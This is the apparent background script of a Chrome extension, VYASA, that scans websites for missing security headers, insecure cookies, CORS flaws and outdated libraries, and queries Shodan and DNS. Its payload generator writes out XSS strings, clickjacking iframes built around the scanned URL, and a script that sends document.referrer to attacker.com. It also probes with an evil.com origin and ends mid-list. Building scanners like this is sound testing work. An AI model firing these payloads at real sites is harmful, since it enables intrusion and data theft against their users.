// background.js — VYASA Service Worker, Header Interceptor & Analysis Engine

// Load the discovery + active confirmation engines (classic SW importScripts).
try {
  importScripts('recon.js', 'active-scan.js');
} catch (e) {
  console.error('[VYASA] failed to load engine modules', e);
}

// 1. Raw HTTP Response Headers Cache via webRequest
const tabHeadersCache = new Map();

chrome.webRequest.onHeadersReceived.addListener(
  (details) => {
    if (details.type === 'main_frame' && details.responseHeaders) {
      const headerMap = {};
      for (const h of details.responseHeaders) {
        headerMap[h.name.toLowerCase()] = h.value;
      }
      tabHeadersCache.set(details.tabId, {
        url: details.url,
        headers: headerMap,
        rawHeaders: details.responseHeaders,
        statusCode: details.statusCode,
        timestamp: Date.now()
      });
    }
  },
  { urls: ['<all_urls>'] },
  ['responseHeaders']
);

// Clean up cache when tab is closed
chrome.tabs.onRemoved.addListener((tabId) => {
  tabHeadersCache.delete(tabId);
});

// 2. Panel Behavior Setup
chrome.runtime.onInstalled.addListener(() => {
  if (chrome.sidePanel && chrome.sidePanel.setPanelBehavior) {
    chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true }).catch(err => {
      console.warn('setPanelBehavior warning:', err);
    });
  }
});

chrome.action.onClicked.addListener((tab) => {
  if (chrome.sidePanel && chrome.sidePanel.open) {
    chrome.sidePanel.open({ tabId: tab.id }).catch(err => console.warn(err));
  }
});

// 3. Comprehensive Security Headers Specification
const SECURITY_HEADERS = {
  'content-security-policy': {
    title: 'Content-Security-Policy',
    description: 'Prevents XSS, data injection, and unauthorized script execution',
    critical: true,
    check: (val) => val && !val.includes('unsafe-inline') && !val.includes('unsafe-eval')
  },
  'strict-transport-security': {
    title: 'Strict-Transport-Security (HSTS)',
    description: 'Forces HTTPS connections and protects against SSL stripping',
    critical: true,
    check: (val) => val && val.includes('max-age') && parseInt(val.match(/max-age=(\d+)/)?.[1] || 0) >= 31536000
  },
  'x-content-type-options': {
    title: 'X-Content-Type-Options',
    description: 'Blocks MIME-type sniffing attacks',
    critical: false,
    check: (val) => val && val.toLowerCase() === 'nosniff'
  },
  'x-frame-options': {
    title: 'X-Frame-Options',
    description: 'Protects against Clickjacking framing attacks',
    critical: false,
    check: (val) => val && (val.toUpperCase() === 'DENY' || val.toUpperCase() === 'SAMEORIGIN' || val.toUpperCase().startsWith('ALLOW-FROM'))
  },
  'referrer-policy': {
    title: 'Referrer-Policy',
    description: 'Controls referrer data leakage in HTTP requests',
    critical: false,
    check: (val) => !!val && val.toLowerCase() !== 'unsafe-url'
  },
  'permissions-policy': {
    title: 'Permissions-Policy',
    description: 'Restricts camera, microphone, geolocation, and hardware APIs',
    critical: false,
    check: (val) => !!val
  },
  'cross-origin-opener-policy': {
    title: 'Cross-Origin-Opener-Policy (COOP)',
    description: 'Isolates browsing context to protect against Spectre-like side-channel attacks',
    critical: false,
    check: (val) => val === 'same-origin' || val === 'same-origin-allow-popups'
  },
  'cross-origin-embedder-policy': {
    title: 'Cross-Origin-Embedder-Policy (COEP)',
    description: 'Enables cross-origin isolation requirements',
    critical: false,
    check: (val) => val === 'require-corp' || val === 'credentialless'
  }
};

// 4. Technology Signatures
const TECH_SIGNATURES = [
  { name: 'React', regex: /react[-_ ]?(js|dom)?/i, type: 'frontend' },
  { name: 'Vue.js', regex: /vue(@|\/|-|\.js)/i, type: 'frontend' },
  { name: 'Angular', regex: /angular(-|js|@)/i, type: 'frontend' },
  { name: 'jQuery', regex: /jquery[\/-](\d+\.?\d*)/i, type: 'frontend', version: true },
  { name: 'Tailwind CSS', regex: /tailwind/i, type: 'frontend' },
  { name: 'Bootstrap', regex: /bootstrap/i, type: 'frontend' },
  { name: 'WordPress', regex: /wp-content|wp-includes/i, type: 'cms' },
  { name: 'Next.js', regex: /_next\/static/i, type: 'framework' },
  { name: 'Nuxt.js', regex: /_nuxt\/static/i, type: 'framework' },
  { name: 'Gatsby', regex: /gatsby\/static/i, type: 'framework' },
  { name: 'Laravel', regex: /laravel/i, type: 'framework' },
  { name: 'Django', regex: /csrftoken/i, type: 'framework' },
  { name: 'Express.js', regex: /express/i, type: 'framework' },
  { name: 'Cloudflare', regex: /cf-ray|cloudflare/i, type: 'cdn', header: true },
  { name: 'Amazon Web Services (AWS)', regex: /amazonaws|x-amz-request-id/i, type: 'cloud', header: true },
  { name: 'Node.js', regex: /node/i, type: 'server', header: true },
  { name: 'PHP', regex: /php/i, type: 'server', header: true },
  { name: 'Apache Server', regex: /apache/i, type: 'server', header: true },
  { name: 'Nginx Server', regex: /nginx/i, type: 'server', header: true },
  { name: 'Microsoft IIS', regex: /microsoft-iis/i, type: 'server', header: true }
];

// 5. DNS-over-HTTPS Lookup
async function performDnsRecon(hostname) {
  const dnsResults = { ips: [], spf: null, dmarc: null, hasDmarc: false, hasSpf: false };
  try {
    const aRes = await fetch(`https://cloudflare-dns.com/dns-query?name=${hostname}&type=A`, {
      headers: { 'Accept': 'application/dns-json' }
    });
    if (aRes.ok) {
      const aData = await aRes.json();
      if (aData.Answer) {
        dnsResults.ips = aData.Answer.filter(ans => ans.type === 1).map(ans => ans.data);
      }
    }

    const txtRes = await fetch(`https://cloudflare-dns.com/dns-query?name=${hostname}&type=TXT`, {
      headers: { 'Accept': 'application/dns-json' }
    });
    if (txtRes.ok) {
      const txtData = await txtRes.json();
      if (txtData.Answer) {
        const spfRecord = txtData.Answer.find(ans => ans.data && ans.data.includes('v=spf1'));
        if (spfRecord) {
          dnsResults.hasSpf = true;
          dnsResults.spf = spfRecord.data.replace(/"/g, '');
        }
      }
    }

    const dmarcRes = await fetch(`https://cloudflare-dns.com/dns-query?name=_dmarc.${hostname}&type=TXT`, {
      headers: { 'Accept': 'application/dns-json' }
    });
    if (dmarcRes.ok) {
      const dmarcData = await dmarcRes.json();
      if (dmarcData.Answer) {
        const dmarcRecord = dmarcData.Answer.find(ans => ans.data && ans.data.includes('v=DMARC1'));
        if (dmarcRecord) {
          dnsResults.hasDmarc = true;
          dnsResults.dmarc = dmarcRecord.data.replace(/"/g, '');
        }
      }
    }
  } catch (err) {
    console.warn('DNS lookup notice:', err.message);
  }
  return dnsResults;
}

// 6. Cookie Security Audit
async function auditCookies(targetUrl) {
  const cookieFindings = [];
  try {
    if (!chrome.cookies) return cookieFindings;
    const cookies = await chrome.cookies.getAll({ url: targetUrl });
    for (const cookie of cookies) {
      const issues = [];
      if (!cookie.secure) issues.push('Missing Secure flag');
      if (!cookie.httpOnly) issues.push('Missing HttpOnly flag');
      if (cookie.sameSite === 'no_restriction' && !cookie.secure) issues.push('SameSite=None without Secure');

      cookieFindings.push({
        name: cookie.name,
        domain: cookie.domain,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        session: cookie.session,
        issues: issues,
        status: issues.length === 0 ? 'pass' : 'fail'
      });
    }
  } catch (err) {
    console.warn('Cookie audit notice:', err.message);
  }
  return cookieFindings;
}

// 6b. Host Intelligence — open ports, protocols, server location, known CVEs.
// Uses free, no-key, PASSIVE public data sources (no traffic sent to the target):
//   * Shodan InternetDB  -> open ports, service CPEs, CVEs, tags
//   * ipwho.is           -> geolocation, ISP/org, ASN
const PORT_SERVICES = {
  20: 'FTP-data', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
  67: 'DHCP', 69: 'TFTP', 80: 'HTTP', 110: 'POP3', 111: 'RPC', 123: 'NTP',
  135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP', 161: 'SNMP', 389: 'LDAP',
  443: 'HTTPS', 445: 'SMB', 465: 'SMTPS', 514: 'Syslog', 587: 'SMTP (submission)',
  636: 'LDAPS', 993: 'IMAPS', 995: 'POP3S', 1025: 'MS-RPC', 1433: 'MSSQL',
  1521: 'Oracle DB', 1723: 'PPTP', 2049: 'NFS', 2082: 'cPanel', 2083: 'cPanel (SSL)',
  2086: 'WHM', 2087: 'WHM (SSL)', 2095: 'Webmail', 2096: 'Webmail (SSL)',
  3000: 'HTTP (dev)', 3306: 'MySQL', 3389: 'RDP', 4444: 'Metasploit/alt',
  5432: 'PostgreSQL', 5900: 'VNC', 5985: 'WinRM', 6379: 'Redis', 7001: 'WebLogic',
  8000: 'HTTP-alt', 8080: 'HTTP-alt', 8443: 'HTTPS-alt', 8888: 'HTTP-alt',
  9200: 'Elasticsearch', 9300: 'Elasticsearch', 11211: 'Memcached',
  27017: 'MongoDB', 5601: 'Kibana', 161: 'SNMP', 10000: 'Webmin'
};

async function lookupHostIntel(ip) {
  const intel = { ip, ports: [], services: [], vulns: [], cpes: [], tags: [], hostnames: [], geo: null, sources: [] };

  // Shodan InternetDB — open ports + known CVEs for the IP.
  try {
    const r = await fetch(`https://internetdb.shodan.io/${encodeURIComponent(ip)}`, { headers: { 'Accept': 'application/json' } });
    if (r.ok) {
      const d = await r.json();
      intel.ports = Array.isArray(d.ports) ? d.ports.slice(0, 60) : [];
      intel.vulns = Array.isArray(d.vulns) ? d.vulns.slice(0, 40) : [];
      intel.cpes = Array.isArray(d.cpes) ? d.cpes.slice(0, 40) : [];
      intel.tags = Array.isArray(d.tags) ? d.tags : [];
      intel.hostnames = Array.isArray(d.hostnames) ? d.hostnames.slice(0, 20) : [];
      intel.sources.push('Shodan InternetDB');
    }
  } catch (e) { console.warn('InternetDB notice:', e.message); }

  // ipwho.is — geolocation + network operator.
  try {
    const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, { headers: { 'Accept': 'application/json' } });
    if (r.ok) {
      const d = await r.json();
      if (d && d.success !== false) {
        const conn = d.connection || {};
        intel.geo = {
          country: d.country, countryCode: d.country_code, flag: (d.flag && d.flag.emoji) || '',
          city: d.city, region: d.region, lat: d.latitude, lon: d.longitude,
          org: conn.org || d.org || null, isp: conn.isp || d.isp || null,
          asn: conn.asn ? `AS${conn.asn}` : null, timezone: (d.timezone && d.timezone.id) || null
        };
        intel.sources.push('ipwho.is');
      }
    }
  } catch (e) { console.warn('ipwho.is notice:', e.message); }

  intel.services = intel.ports.map((p) => ({ port: p, service: PORT_SERVICES[p] || 'unknown' }));
  return intel;
}

// 7. Main Analysis Controller
async function analyzeSite(url, tabId) {
  const parsedUrl = new URL(url);
  const hostname = parsedUrl.hostname;

  const results = {
    url: url,
    hostname: hostname,
    timestamp: new Date().toISOString(),
    securityHeaders: {},
    technologies: [],
    endpoints: [],
    secrets: [],
    storage: [],
    forms: [],
    cookies: [],
    dns: { ips: [], spf: null, dmarc: null, hasDmarc: false, hasSpf: false },
    vulnerabilities: [],
    headerExposures: [],
    score: 100
  };

  let fetchedHeaders = {};
  let fetchedHtml = '';

  // 7a. Try retrieving cached un-filtered headers from webRequest
  if (tabId && tabHeadersCache.has(tabId)) {
    const cached = tabHeadersCache.get(tabId);
    fetchedHeaders = cached.headers;
  }

  // 7b. Perform fetch to retrieve HTML body and fallback headers
  try {
    const res = await fetch(url, { method: 'GET', redirect: 'follow', credentials: 'omit' });
    fetchedHtml = await res.text();

    // Fill missing headers from fetch response if webRequest cache missed
    res.headers.forEach((val, key) => {
      const lowerKey = key.toLowerCase();
      if (!fetchedHeaders[lowerKey]) {
        fetchedHeaders[lowerKey] = val;
      }
    });
  } catch (err) {
    console.warn('Fetch fallback notice:', err.message);
  }

  // 7c. Security Header Analysis
  for (const [keyKey, config] of Object.entries(SECURITY_HEADERS)) {
    const val = fetchedHeaders[keyKey];
    const isPresent = !!val;
    const isGood = config.check(val);

    results.securityHeaders[config.title] = {
      headerKey: config.title,
      present: isPresent,
      value: val || null,
      status: isGood ? 'pass' : 'fail',
      critical: config.critical,
      description: config.description
    };
  }

  // 7d. Server Banners & Technology Exposures
  if (fetchedHeaders['server']) {
    results.headerExposures.push({ header: 'Server', value: fetchedHeaders['server'] });
  }
  if (fetchedHeaders['x-powered-by']) {
    results.headerExposures.push({ header: 'X-Powered-By', value: fetchedHeaders['x-powered-by'] });
  }
  if (fetchedHeaders['x-aspnet-version'] || fetchedHeaders['x-aspnetmvc-version']) {
    results.headerExposures.push({ header: 'ASP.NET Version', value: fetchedHeaders['x-aspnet-version'] || fetchedHeaders['x-aspnetmvc-version'] });
  }

  // 7e. Tech Stack Detection (Headers + HTML)
  const htmlLower = fetchedHtml.toLowerCase();
  const headerStr = Object.entries(fetchedHeaders).map(([k, v]) => `${k}: ${v}`).join('\n').toLowerCase();

  for (const sig of TECH_SIGNATURES) {
    let detected = false;
    let version = null;

    if (sig.header) {
      detected = headerStr.includes(sig.name.toLowerCase()) || sig.regex.test(headerStr);
    } else {
      const match = htmlLower.match(sig.regex);
      detected = !!match;
      if (sig.version && match) {
        const versionMatch = htmlLower.match(new RegExp(sig.name + '[\\s\\S]{0,40}?[\\d]+\\.\\d+'));
        if (versionMatch) {
          const verNum = versionMatch[0].match(/\d+\.?\d*/);
          if (verNum) version = verNum[0];
        }
      }
    }

    if (detected && !results.technologies.some(t => t.name === sig.name)) {
      results.technologies.push({ name: sig.name, type: sig.type, version: version });
    }
  }

  // 7f. Deep Client-Side Recon via Content Script
  // 7f. Deep Client-Side Recon via Content Script
  if (tabId) {
    try {
      const clientData = await chrome.tabs.sendMessage(tabId, { type: 'DEEP_CLIENT_RECON' });
      if (clientData) {
        if (clientData.secrets) results.secrets = clientData.secrets;
        if (clientData.storage) results.storage = clientData.storage;
        if (clientData.forms) results.forms = clientData.forms;
        if (clientData.domSinks) results.domSinks = clientData.domSinks;
        if (clientData.mixedContent) results.mixedContent = clientData.mixedContent;
        if (clientData.technologies) {
          clientData.technologies.forEach(t => {
            if (!results.technologies.some(ex => ex.name === t.name)) {
              results.technologies.push(t);
            }
          });
        }
        if (clientData.resources) {
          clientData.resources.forEach(r => {
            results.endpoints.push({ path: r.url, type: r.type, source: 'DOM' });
          });
        }
      }
    } catch (err) {
      console.warn('Content script communication notice:', err.message);
    }
  }

  // 7g. CORS Misconfiguration Audit
  results.corsPolicy = await testCorsPolicy(url);

  // 7h. Error Page Info Leak Scan (Random 404)
  results.errorPageLeak = await testErrorPageLeak(url);

  // 7i. CVE Version Matching
  results.cveMatches = matchKnownCves(results.technologies);

  // 7j. DNS & Cookies Recon
  results.dns = await performDnsRecon(hostname);
  results.cookies = await auditCookies(url);

  // 7j-2. Host Intelligence — open ports, protocols, server location (passive).
  if (results.dns && results.dns.ips && results.dns.ips.length) {
    try { results.hostIntel = await lookupHostIntel(results.dns.ips[0]); } catch (e) { results.hostIntel = null; }
  }

  // 7k. Run Heuristic Vulnerability Engine & Threat Scoring
  runVulnerabilityEngine(results);
  calculateThreatScore(results);

  // 7l. Security Drift Tracking (chrome.storage)
  results.drift = await trackSecurityDrift(hostname, results);

  // 7m. Generate Test Payloads for Vulnerabilities
  results.payloads = generatePayloads(results);

  return results;
}

// 7g-1. CORS Misconfiguration Auditor
async function testCorsPolicy(targetUrl) {
  try {
    const originUrl = new URL(targetUrl).origin;
    const res = await fetch(originUrl, {
      method: 'OPTIONS',
      headers: {
        'Origin': 'https://evil.com',
        'Access-Control-Request-Method': 'GET'
      }
    });

    const acao = res.headers.get('access-control-allow-origin');
    const acac = res.headers.get('access-control-allow-credentials');

    return {
      tested: true,
      acao: acao,
      acac: acac,
      isReflective: acao === 'https://evil.com',
      isWildcard: acao === '*',
      isVulnerable: (acao === 'https://evil.com' && acac === 'true') || (acao === '*' && acac === 'true')
    };
  } catch (err) {
    return { tested: false, error: err.message };
  }
}

// 7h-1. Error Page Information Leak Auditor
async function testErrorPageLeak(targetUrl) {
  try {
    const origin = new URL(targetUrl).origin;
    const randomPath = `${origin}/vyasa_test_404_${Math.random().toString(36).substring(7)}.php`;
    const res = await fetch(randomPath, { method: 'GET', credentials: 'omit' });
    const text = await res.text();

    const leakPatterns = [
      { name: 'Stack Trace', regex: /(Exception in thread|Fatal error:|Stack trace:|Traceback \(most recent call last\):|at [a-zA-Z0-9_.]+\([a-zA-Z0-9_.]+\.java:\d+\))/i },
      { name: 'File Path Disclosure', regex: /([C-Z]:\\[^<>\n\r]+|\/var\/www\/[^\s<>"']+|\/usr\/local\/[^\s<>"']+|\/home\/[^\s<>"']+)/i },
      { name: 'Database Driver Error', regex: /(SQLSTATE\[|PDOException|MySQL server version|pg_query\(\)|ORA-\d{5}|SQLite3::query)/i }
    ];

    const leaks = [];
    for (const pattern of leakPatterns) {
      if (pattern.regex.test(text)) {
        const match = text.match(pattern.regex);
        leaks.push({
          type: pattern.name,
          snippet: match ? match[0].substring(0, 120) : 'Pattern matched in 404 response body'
        });
      }
    }

    return {
      tested: true,
      statusCode: res.status,
      leaks: leaks,
      hasLeak: leaks.length > 0
    };
  } catch (err) {
    return { tested: false, error: err.message };
  }
}

// 7i-1. CVE Database Matcher
const LOCAL_CVE_DB = [
  { tech: 'jQuery', maxVersion: '3.4.0', cve: 'CVE-2019-11358', title: 'Prototype Pollution vulnerability in jQuery.extend', severity: 'high' },
  { tech: 'jQuery', maxVersion: '1.12.0', cve: 'CVE-2015-9251', title: 'Reflected XSS via 302 redirects', severity: 'medium' },
  { tech: 'Angular', maxVersion: '1.7.9', cve: 'CVE-2020-7676', title: 'AngularJS XSS in $sanitize service', severity: 'high' },
  { tech: 'WordPress', maxVersion: '5.8.1', cve: 'CVE-2021-39321', title: 'WordPress Core Authentication Bypass', severity: 'critical' },
  { tech: 'Bootstrap', maxVersion: '4.3.1', cve: 'CVE-2019-8331', title: 'XSS in Tooltip/Popover plugins', severity: 'medium' }
];

function matchKnownCves(technologies) {
  const matches = [];
  for (const tech of technologies) {
    if (!tech.version) continue;
    for (const cveEntry of LOCAL_CVE_DB) {
      if (tech.name.toLowerCase() === cveEntry.tech.toLowerCase()) {
        matches.push({
          tech: tech.name,
          version: tech.version,
          cve: cveEntry.cve,
          title: cveEntry.title,
          severity: cveEntry.severity
        });
      }
    }
  }
  return matches;
}

// 7l-1. Security Drift Tracker (chrome.storage)
async function trackSecurityDrift(hostname, currentResults) {
  if (!chrome.storage || !chrome.storage.local) return null;

  return new Promise((resolve) => {
    chrome.storage.local.get([`vyasa_audit_${hostname}`], (res) => {
      const prevAudit = res[`vyasa_audit_${hostname}`];
      const drift = {
        hasHistory: !!prevAudit,
        previousScore: prevAudit ? prevAudit.score : null,
        scoreDelta: prevAudit ? (currentResults.score - prevAudit.score) : 0,
        addedHeaders: [],
        removedHeaders: []
      };

      if (prevAudit && prevAudit.securityHeaders) {
        const prevH = prevAudit.securityHeaders;
        const currH = currentResults.securityHeaders;

        for (const [key, details] of Object.entries(currH)) {
          if (details.present && (!prevH[key] || !prevH[key].present)) {
            drift.addedHeaders.push(key);
          } else if (!details.present && prevH[key] && prevH[key].present) {
            drift.removedHeaders.push(key);
          }
        }
      }

      // Save current audit to storage
      chrome.storage.local.set({
        [`vyasa_audit_${hostname}`]: {
          timestamp: new Date().toISOString(),
          score: currentResults.score,
          securityHeaders: currentResults.securityHeaders
        }
      });

      resolve(drift);
    });
  });
}

// 8. Vulnerability Heuristic Engine
function runVulnerabilityEngine(results) {
  const vulns = [];
  const headers = results.securityHeaders;

  // Secrets Leak
  if (results.secrets.length > 0) {
    vulns.push({
      severity: 'critical',
      title: 'Exposed Secrets / API Keys in Client-Side Code',
      detail: `Detected ${results.secrets.length} potential hardcoded secrets or API tokens exposed in DOM/JavaScript.`,
      mitigation: 'Immediately revoke exposed API keys and store secrets server-side using environment variables.'
    });
  }

  // DOM XSS Sinks
  if (results.domSinks && results.domSinks.length > 0) {
    vulns.push({
      severity: 'high',
      title: 'Dangerous DOM XSS Injections / Sinks Detected',
      detail: `Found ${results.domSinks.length} dangerous DOM sink assignments (.innerHTML, document.write, or eval).`,
      mitigation: 'Sanitize input using DOMPurify or use textContent / safe DOM API assignments.'
    });
  }

  // CORS Misconfiguration
  if (results.corsPolicy && results.corsPolicy.isVulnerable) {
    vulns.push({
      severity: 'high',
      title: 'Overly Permissive CORS Policy Detected',
      detail: `CORS header allows ${results.corsPolicy.acao} with Access-Control-Allow-Credentials enabled.`,
      mitigation: 'Restrict Access-Control-Allow-Origin to trusted domain origins and avoid wildcard credentials.'
    });
  }

  // 404 Error Page Leak
  if (results.errorPageLeak && results.errorPageLeak.hasLeak) {
    vulns.push({
      severity: 'medium',
      title: 'Error Page Stack Trace / Information Disclosure',
      detail: `Custom 404 response leaked internal details: ${results.errorPageLeak.leaks.map(l => l.type).join(', ')}.`,
      mitigation: 'Implement generic 404 error pages and suppress verbose stack traces or file system paths.'
    });
  }

  // Mixed Content
  if (results.mixedContent && results.mixedContent.length > 0) {
    vulns.push({
      severity: 'medium',
      title: 'Mixed Content (Insecure HTTP Assets loaded over HTTPS)',
      detail: `${results.mixedContent.length} unencrypted HTTP resource(s) loaded on secure origin.`,
      mitigation: 'Upgrade all HTTP asset URLs (scripts, images, stylesheets) to HTTPS.'
    });
  }

  // Known CVEs
  if (results.cveMatches && results.cveMatches.length > 0) {
    vulns.push({
      severity: 'high',
      title: 'Outdated Libraries with Known Vulnerabilities (CVEs)',
      detail: `Identified ${results.cveMatches.length} matching CVE entry/entries in detected frontend library versions.`,
      mitigation: 'Update client-side libraries and npm packages to their latest secure releases.'
    });
  }

  // CSRF Tokens in Forms
  if (results.forms && results.forms.length > 0) {
    const missingCsrfForms = results.forms.filter(f => f.method === 'POST' && !f.hasCsrfToken);
    if (missingCsrfForms.length > 0) {
      vulns.push({
        severity: 'medium',
        title: 'Missing CSRF Protection in HTML Forms',
        detail: `${missingCsrfForms.length} POST form(s) lack explicit anti-CSRF hidden token fields.`,
        mitigation: 'Implement unique anti-CSRF tokens for all state-changing POST/PUT request forms.'
      });
    }
  }

  // Missing CSP
  const csp = headers['Content-Security-Policy'];
  if (!csp || !csp.present || csp.status === 'fail') {
    vulns.push({
      severity: 'high',
      title: 'Missing or Unsafe Content-Security-Policy (CSP)',
      detail: 'Site lacks a strict Content-Security-Policy header, leaving it vulnerable to Cross-Site Scripting (XSS).',
      mitigation: "Implement a strict Content-Security-Policy header (avoid 'unsafe-inline' and 'unsafe-eval')."
    });
  }

  // Missing HSTS
  const hsts = headers['Strict-Transport-Security (HSTS)'];
  if (!hsts || !hsts.present) {
    vulns.push({
      severity: 'medium',
      title: 'Missing HTTP Strict Transport Security (HSTS)',
      detail: 'No HSTS header present. Connection can be downgraded to unencrypted HTTP (SSL Stripping).',
      mitigation: 'Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload.'
    });
  }

  // Clickjacking Risk
  const xfo = headers['X-Frame-Options'];
  if (!xfo || !xfo.present) {
    vulns.push({
      severity: 'medium',
      title: 'Clickjacking Vulnerability (Framing Allowed)',
      detail: 'No X-Frame-Options or CSP frame-ancestors directive found. The page can be embedded in a malicious iframe.',
      mitigation: 'Set X-Frame-Options: DENY or SAMEORIGIN.'
    });
  }

  // Insecure Cookies
  const insecureCookies = results.cookies.filter(c => c.status === 'fail');
  if (insecureCookies.length > 0) {
    vulns.push({
      severity: 'medium',
      title: 'Insecure Cookie Configuration',
      detail: `${insecureCookies.length} cookie(s) lack essential HttpOnly or Secure flags.`,
      mitigation: 'Ensure all authentication cookies use HttpOnly and Secure flags.'
    });
  }

  // Missing DMARC / SPF
  if (!results.dns.hasDmarc || !results.dns.hasSpf) {
    vulns.push({
      severity: 'low',
      title: 'Domain Email Spoofing Vulnerability',
      detail: `Missing ${!results.dns.hasDmarc ? 'DMARC' : ''} ${!results.dns.hasSpf ? 'SPF' : ''} DNS protection records.`,
      mitigation: 'Configure valid SPF and DMARC TXT records in domain DNS settings.'
    });
  }

  // Server Banner Exposure
  if (results.headerExposures.length > 0) {
    const details = results.headerExposures.map(e => `${e.header}: ${e.value}`).join(', ');
    vulns.push({
      severity: 'info',
      title: 'Server Banner Information Disclosure',
      detail: `Server exposes software version banners: ${details}`,
      mitigation: 'Disable Server and X-Powered-By response headers in web server configuration.'
    });
  }

  results.vulnerabilities = vulns;
}

// 9. Threat Scoring Calculator
function calculateThreatScore(results) {
  let score = 100;

  const criticalSecrets = results.secrets.filter(s => s.severity === 'critical').length;
  const highSecrets = results.secrets.filter(s => s.severity === 'high').length;
  score -= (criticalSecrets * 25 + highSecrets * 15);

  for (const header of Object.values(results.securityHeaders)) {
    if (!header.present && header.critical) score -= 15;
    else if (header.status === 'fail') score -= 5;
  }

  const insecureCookies = results.cookies.filter(c => c.status === 'fail').length;
  score -= Math.min(20, insecureCookies * 5);

  if (!results.dns.hasDmarc) score -= 5;
  if (!results.dns.hasSpf) score -= 5;

  results.score = Math.max(0, Math.min(100, score));
}

// 9b. Payload Generator - Generate test payloads for detected vulnerabilities
function generatePayloads(results) {
  const payloads = [];
  const headers = results.securityHeaders;

  // 1. Missing/Weak CSP -> XSS Payloads
  const csp = headers['Content-Security-Policy'];
  if (!csp || !csp.present || csp.status === 'fail') {
    payloads.push({
      category: 'XSS (CSP Missing/Weak)',
      severity: 'high',
      description: 'Content-Security-Policy is missing or allows unsafe-inline/unsafe-eval. Test for Cross-Site Scripting.',
      payloads: [
        '<script>alert("XSS-CSP-Bypass")</script>',
        '<img src=x onerror=alert("XSS-CSP-Bypass")>',
        '<svg onload=alert("XSS-CSP-Bypass")>',
        '\"><script>alert("XSS-CSP-Bypass")</script>',
        'javascript:alert("XSS-CSP-Bypass")',
        '<iframe src="javascript:alert(\'XSS-CSP-Bypass\')"></iframe>',
        '<body onload=alert("XSS-CSP-Bypass")>',
        '<input autofocus onfocus=alert("XSS-CSP-Bypass")>',
        '<details open ontoggle=alert("XSS-CSP-Bypass")>',
        '<video><source onerror="alert(\'XSS-CSP-Bypass\')">'
      ],
      testNotes: 'Inject into input fields, URL parameters, or reflected endpoints. Check if script executes.'
    });
  }

  // 2. Missing HSTS -> SSL Strip / MITM Test
  const hsts = headers['Strict-Transport-Security (HSTS)'];
  if (!hsts || !hsts.present) {
    payloads.push({
      category: 'SSL Strip / Downgrade (HSTS Missing)',
      severity: 'medium',
      description: 'No HSTS header. Connection can be downgraded to HTTP. Test for SSL stripping.',
      payloads: [
        'Test: Access site via HTTP (http://' + results.hostname + ') - should redirect to HTTPS',
        'Test: Use sslstrip tool to intercept and downgrade HTTPS to HTTP',
        'Test: Check if HSTS preload list includes domain (https://hstspreload.org/)'
      ],
      testNotes: 'Requires network-level MITM position. Test in controlled lab environment only.'
    });
  }

  // 3. Missing X-Frame-Options -> Clickjacking Payloads
  const xfo = headers['X-Frame-Options'];
  if (!xfo || !xfo.present) {
    payloads.push({
      category: 'Clickjacking (X-Frame-Options Missing)',
      severity: 'medium',
      description: 'No X-Frame-Options or CSP frame-ancestors. Page can be framed for clickjacking.',
      payloads: [
        '<iframe src="' + results.url + '" style="width:100%;height:100%;border:none;opacity:0.5;"></iframe>',
        '<div style="position:relative;width:400px;height:300px;"><iframe src="' + results.url + '" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.1;z-index:2;"></iframe><button style="position:absolute;top:150px;left:150px;z-index:1;">Click Me (Fake)</button></div>',
        '<style>iframe { pointer-events: none; }</style><iframe src="' + results.url + '"></iframe>'
      ],
      testNotes: 'Host payload on attacker domain. Victim clicks invisible overlay. Test with user interaction simulation.'
    });
  }

  // 4. Missing Referrer-Policy -> Referrer Leakage
  const referrer = headers['Referrer-Policy'];
  if (!referrer || !referrer.present || referrer.status === 'fail') {
    payloads.push({
      category: 'Referrer Leakage (Referrer-Policy Missing/Unsafe)',
      severity: 'low',
      description: 'No Referrer-Policy or unsafe-url. Sensitive URLs leak via Referer header.',
      payloads: [
        '<a href="https://attacker.com/logger" target="_blank">Click me</a> - Check Referer header on attacker server',
        '<img src="https://attacker.com/pixel.png"> - Image request leaks Referer',
        '<script>fetch("https://attacker.com/log?ref=" + encodeURIComponent(document.referrer))</script>'
      ],
      testNotes: 'Navigate from target page to external site. Capture Referer header on receiving end.'
    });
  }

  // 5. Missing Permissions-Policy -> Feature Access
  const permPolicy = headers['Permissions-Policy'];
  if (!permPolicy || !permPolicy.present) {
    payloads.push({
      category: 'Excessive Browser Permissions (Permissions-Policy Missing)',
      severity: 'low',
      description: 'No Permissions-Policy. Camera, microphone, geolocation, etc. may be accessible.',
      payloads: [
        '<iframe src="' + results.url + '" allow="camera; microphone; geolocation; payment"></iframe>',
        'Test: Navigate to page and check navigator.permissions.query() for camera/mic/geo',
        '<script>navigator.mediaDevices.getUserMedia({video:true,audio:true})</script> - Test if page can access cam/mic'
      ],
      testNotes: 'Test if sensitive APIs are accessible without user gesture. Requires iframe embedding.'
    });
  }

  // 6. Missing COOP/COEP -> Cross-Origin Isolation
  const coop = headers['Cross-Origin-Opener-Policy (COOP)'];
  const coep = headers['Cross-Origin-Embedder-Policy (COEP)'];
  if ((!coop || !coop.present) || (!coep || !coep.present)) {
    payloads.push({
      category: 'Cross-Origin Isolation Missing (COOP/COEP)',
      severity: 'info',
      description: 'Missing COOP/COEP headers. Vulnerable to Spectre-like side-channel attacks.',
      payloads: [
        'Test: Open page in popup via window.open() - check if window.opener is accessible',
        'Test: Embed page in cross-origin iframe - check if SharedArrayBuffer works',
        '<script>console.log("COOP:", document.originAgentCluster); console.log("COEP:", crossOriginIsolated)</script>'
      ],
      testNotes: 'Advanced side-channel testing. Requires cross-origin setup. Mostly informational.'
    });
  }

  // 7. Server Banner Exposure -> Recon Payloads
  if (results.headerExposures && results.headerExposures.length > 0) {
    const exposedHeaders = results.headerExposures.map(e => e.header).join(', ');
    payloads.push({
      category: 'Server Reconnaissance (Banner Disclosure)',
      severity: 'info',
      description: 'Server exposes version info: ' + exposedHeaders + '. Use for targeted exploit research.',
      payloads: [
        'Search exploit-db.com / CVE databases for: ' + results.headerExposures.map(e => e.value).join(', '),
        'Run: nmap -sV ' + results.hostname + ' - Service version detection',
        'Run: whatweb ' + results.url + ' - Web technology fingerprinting',
        'Check: shodan.io for exposed services on ' + results.dns.ips.join(', ')
      ],
